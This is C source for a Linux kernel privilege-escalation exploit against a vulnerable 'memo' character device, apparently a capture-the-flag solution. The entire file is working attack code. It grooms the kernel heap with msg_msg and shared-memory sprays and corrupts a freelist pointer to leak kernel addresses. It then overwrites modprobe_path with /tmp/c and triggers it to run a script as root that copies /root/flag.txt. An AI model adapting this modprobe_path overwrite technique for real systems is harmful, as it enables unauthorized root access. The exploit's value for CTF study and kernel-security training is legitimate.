#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/shm.h>

#define DEVICE_NAME "memo"
#define NOTE_SIZE sizeof(note_t)
#define CMD_NEW  0x11451401
#define CMD_EDIT 0x11451402
#define CMD_DEL  0x11451403

typedef struct {
  char data[20];
  int id;
  int size;
} request_t;

typedef struct 
{
    long mtype;
    char mtext[0x10000];
} msg;

msg msgbuf;

struct msg_header
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
} ;

int msg_open()
{
    int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);

    if (qid == -1)
    {
        perror("msgget");
        exit(-1);
    }

    return qid;
}

int msgsend(int qid, void* msg, size_t size, int flag) {
    int res;

    if ((res = msgsnd(qid, msg, size, flag)) == -1) {
        perror("msgsnd");
        exit(-1);
    }

    return res;
}

int msgalloc(int qid, char *data, unsigned int size)
{
    msgbuf.mtype = 1;

    memcpy(msgbuf.mtext, &data[0x30], size - 0x30);

    return msgsend(qid, &msgbuf, size-0x30, 0);
}

long donew(int fd) {
    request_t req;
    return ioctl(fd, CMD_NEW, &req);
}

long doedit(int fd, int id, int size, char* payload) {
    request_t req = {
        .id = id,
        .size = size
    };

    memcpy(req.data, payload, 20);

    return ioctl(fd, CMD_EDIT, &req);
}

long dodel(int fd, int id) {
    request_t req = {
        .id = id
    };

    return ioctl(fd, CMD_DEL, &req);
}

int key[200];
char payload[0xf000];

void spray_shmem(int count, int size) {
    int shmid;
    char *shmaddr;

    for (int i = 0; i < count; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, size, 0600)) == -1)
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);

        if (shmaddr == (void *)-1)
        {
            perror("shmat error");
            exit(-1);
        }
    }
}

int main(int argc, char **argv[])
{
    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/c");
    system("chmod +x /tmp/c");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    void* map = mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_FIXED|MAP_PRIVATE, -1, 0);

    int fd = open("/dev/memo", O_RDWR);
    int qid = msg_open();

    // remote fix 8)
    if(argc>1) {
        key[100] = donew(fd);        
    }

    // Create initial notes
    for(int i=0; i<2; i++) {
        key[i] = donew(fd);
    }

    request_t req1;
    unsigned long* lptr = &(req1.data);

    // forge good lsb byte for fd overwrite
    while(1) {
        key[2] = donew(fd);

        if((key[2] & 0xff) == 0xc0) {            
            printf("Good key        : %p\n", key[2]);
            break;
        }
        else {
            dodel(fd, key[2]);
        }
    }

    memset(payload, 0x41, 0x2000);

    lptr = &(payload[0xfd0+0x30+0x10]);
    (*lptr++) = 0x1337000;
    (*lptr++) = 0x1337100;

    // Create msg_seq behind second note
    msgalloc(qid, payload, 0xfd0 + 0x40 + 0x20);

    // Overwrite lsb of note2->fd
    memset(payload, 0x41, 0x20);
    doedit(fd, key[2], 0x15, payload);
    
    // delete msg_msg seq to trigger unlink into mapped region
    dodel(fd, 0x0);

    // receive msg for kernel heap leak
    msgrcv(qid, payload, 0xfd0+0x40+0x20, 1, 0);

    unsigned long kleak = *((unsigned long*)&(payload[0xff0]));

    printf("kernel leak     : %p\n", kleak);
    
    unsigned long modprobe_target = kleak - 0x198;
    printf("modprobe_target : %p\n", modprobe_target);

    // put shmem structs on the note heap
    spray_shmem(20, 0x40);

    dodel(fd, key[2]);

    // recreate second note until LSB would point into note itself
    while(1) {
        key[2] = donew(fd);

        if((key[2] & 0xff) == 0x90) {            
            printf("Good key        : %p\n", key[2]);                    
            break;
        }
        else {
            dodel(fd, key[2]);
        }
    }

    // overwrite fd lsb with id lsb
    doedit(fd, key[2], 0x15, payload);
    
    // allocate msg_msg behind note
    msgalloc(qid, payload, 0x40);

    // prepare payload to overwrite note 2 fd
    memset(payload, 0, 0x40);
    lptr = &(payload[4]);
    *lptr = kleak-0x30;

    doedit(fd, 0x41414141, 0x4+8, payload);     

    // prepare payload to overwrite msg_msg
    memset(payload, 0, 0x40);
    lptr = &(payload[4]);
    (*lptr++) = 0x2000;
    (*lptr++) = modprobe_target-8;

    doedit(fd, 0x1, 0x4+8+8, payload);
    
    // receive corrupted msg_msg for leak    
    msgrcv(qid, payload, 0x2000, 1, 0);

    unsigned long modprobe_leak = *((unsigned long*)&(payload[0xfd8]));
    unsigned long modprobe = modprobe_leak - 0x7bfe0;

    printf("modprobe leak   : %p\n", modprobe_leak);
    printf("modprobe        : %p\n", modprobe);

    // Trying to fix remote issues ;)
    key[3] = donew(fd);
    key[4] = donew(fd);

    while(1) {
        key[4] = donew(fd);

        if((key[4] & 0xff) == 0x8c) {
            printf("Good key        : %p\n", key[4]);
            break;
        }
        else {
            dodel(fd, key[4]);
        }
    }

    // Overwrite fd lsb
    memset(payload, 0, 0x40);
    doedit(fd, key[4], 0x15, payload);

    lptr = &(payload[0]);
    (*lptr++) = 0x1;                    // new note id
    (*lptr++) = modprobe - 0x10+4;      // fd => modprobe_path
    
    doedit(fd, 0x0, 0x8+8, payload);

    memset(payload, 0, 0x40);
    strcpy(payload+8, "/tmp/c");

    // overwrite modprobe_path with /tmp/c
    doedit(fd, 0, 0x10, payload);

    system("/tmp/dummy");               // trigger modprobe copy
    system("cat /tmp/flag");

    close(fd);
}
